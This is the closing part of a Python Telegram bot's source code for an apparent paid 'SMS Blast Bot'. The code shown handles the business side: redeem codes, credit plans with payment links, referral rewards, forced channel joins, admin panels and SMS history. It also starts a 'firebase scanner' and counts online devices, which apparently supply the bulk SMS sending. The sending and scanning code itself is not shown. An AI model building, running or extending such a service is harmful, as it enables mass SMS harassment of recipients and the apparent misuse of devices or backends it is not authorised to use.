    d = load()
    uses = int(msg.text.strip())
    cr = (await state.get_data()).get("gen_credits", 10)
    await state.clear()
    code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    d.setdefault("redeem_codes", {})[code] = {"credits": cr, "uses_left": uses, "used_by": []}
    save(d)
    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} Code: <code>{code}</code> (💰{cr}, {uses} uses)", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery):
    d = load()
    rows = [[btn(c, f"owner:redeem:deldo:{c}", EMOJI_CROSS, "🗑", style="danger")] for c in list(d.get("redeem_codes", {}).keys())[:15]]
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} Delete Code", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery):
    d = load()
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    d.get("redeem_codes", {}).pop(code, None)
    save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq)

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery):
    d = load()
    fj = d.get("force_join", {})
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ᴛᴏɢɢʟᴇ ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:toggle", EMOJI_BELL, "🔄", style="primary")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>: {'ON' if fj.get('enabled') else 'OFF'}", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(f"{em(EMOJI_BELL, '🔗')} Channel ID bhejein (e.g. -100xxx):", reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    await state.update_data(fj_channel_id=int(msg.text.strip()))
    await state.set_state(S.fj_add_link)
    await msg.answer(f"{em(EMOJI_BELL, '🔗')} Invite link bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    ch_id = str((await state.get_data()).get("fj_channel_id"))
    link = msg.text.strip()
    await state.clear()
    try:
        title = (await msg.bot.get_chat(int(ch_id))).title or "Channel"
    except Exception:
        title = "Channel"
    chs = [c for c in d.setdefault("force_join", {}).setdefault("channels", []) if str(c["id"]) != ch_id]
    chs.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = chs
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Added {title}", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery):
    d = load()
    rows = [[btn(c.get("title", "Channel")[:20], f"owner:fj:del:{c['id']}", EMOJI_CROSS, "🗑", style="danger")] for c in d.get("force_join", {}).get("channels", [])]
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} Remove Channel", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery):
    d = load()
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    d["force_join"]["channels"] = [c for c in d.get("force_join", {}).get("channels", []) if str(c["id"]) != ch_id]
    save(d)
    await owner_fj_menu(cq)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery):
    d = load()
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await owner_fj_menu(cq)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    txt = "\n".join(f"• <b>{p['name']}</b> — ₹{p['price']} = {p['credits']} credits" for p in plans) or "<i>No credit plans</i>"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💳')} <b>Credit Plans</b>\n\n{txt}", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text("Plan name bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer("Price bhejein:", parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    await state.update_data(plan_price=float(msg.text.strip()))
    await state.set_state(S.add_plan_credits)
    await msg.answer("Credits kitne hain?", parse_mode="HTML")

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    await state.update_data(plan_credits=int(msg.text.strip()))
    await state.set_state(S.add_plan_link)
    await msg.answer("Payment link (https://...) bhejein:", parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    data = await state.get_data()
    await state.clear()
    d.setdefault("pricing", {}).setdefault("plans", []).append({
        "id": str(int(time.time())),
        "name": data["plan_name"],
        "price": data["plan_price"],
        "credits": data["plan_credits"],
        "currency": "INR",
        "payment_link": msg.text.strip(),
    })
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Plan added!", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery):
    d = load()
    rows = [[btn(p["name"][:20], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑", style="danger")] for p in d.get("pricing", {}).get("plans", [])]
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text("Remove Plan:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery):
    d = load()
    pid = cq.data.split("owner:pricing:del:", 1)[1]
    d["pricing"]["plans"] = [p for p in d.get("pricing", {}).get("plans", []) if p["id"] != pid]
    save(d)
    await owner_pricing_menu(cq)

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery):
    d = load()
    ref = d.get("settings", {}).get("ref_credits", 3)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\nReferral Credits: <b>{ref}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁", style="primary")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
        ]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text("Referral credits kitne dene hain?", reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]), parse_mode="HTML")

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    d.setdefault("settings", {})["ref_credits"] = int(msg.text.strip())
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Referral credits updated.", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery):
    d = load()
    entries = d.get("activity_log", [])[-15:]
    txt = "\n".join(f"[{fmt_time(e.get('timestamp', 0))}] <code>{e.get('uid')}</code> — <b>{e.get('action')}</b> {e.get('details', '')}" for e in reversed(entries)) or "<i>No activity</i>"
    await cq.message.edit_text(f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n{txt}"[:4000], reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery):
    total = sum(len(v) for v in load().get("sms_history", {}).values())
    await cq.message.edit_text(f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\nTotal records: <b>{total}</b>", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting script...")
    path = os.path.abspath(__file__)
    if os.path.exists(path):
        await cq.message.reply_document(document=FSInputFile(path), caption=f"📤 <b>{_VERSION}</b>", parse_mode="HTML")

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    devs = get_cached_devices() or await get_all_online_devices(d)
    await cq.message.edit_text((api_stats_text(d) + f"\n\n🟢 Online: <b>{len(devs)}</b>")[:4000], reply_markup=kb([(f"{sc('back')}", "admin:home")]), parse_mode="HTML")

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery):
    await cq.answer(f"💰 Credits: {get_user_credits(cq.from_user.id, load())}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} Redeem code bhejein:", reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    c_data = d.get("redeem_codes", {}).get(code)
    if not c_data or c_data.get("uses_left", 0) <= 0 or uid in c_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid ya already used code!", reply_markup=user_kb(), parse_mode="HTML")
        return
    add_credits(uid, c_data["credits"], d)
    c_data["uses_left"] -= 1
    c_data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} +{c_data['credits']} credits added!", reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral</b>\nCode: <code>{code}</code>\nLink: https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery):
    d = load()
    u = d["users"].get(str(cq.from_user.id), {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n💰 Credits: <b>{u.get('credits', 0)}</b>\n📤 Sent: <b>{u.get('uses', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery):
    d = load()
    hist = d.get("sms_history", {}).get(str(cq.from_user.id), [])[-10:]
    txt = "\n".join(f"• <code>{mask_number(e.get('number', ''))}</code> — {e.get('message', '')[:25]}" for e in reversed(hist)) or "<i>No SMS history</i>"
    await cq.message.edit_text(f"{em(EMOJI_GEAR, '📜')} <b>SMS History</b>\n\n{txt}", reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Abhi koi credit plan nahi hai!", show_alert=True)
        return
    rows = [[btn_url(f"Buy {p['name']} — ₹{p['price']}", p["payment_link"], EMOJI_MONEY, "💳", style="success")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\nOwner: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True,
    )

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

async def main():
    global AUTO_MSG_TASK
    load()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    asyncio.create_task(background_firebase_scanner(bot))
    AUTO_MSG_TASK = asyncio.create_task(auto_msg_loop(bot))

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}",
            parse_mode="HTML",
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
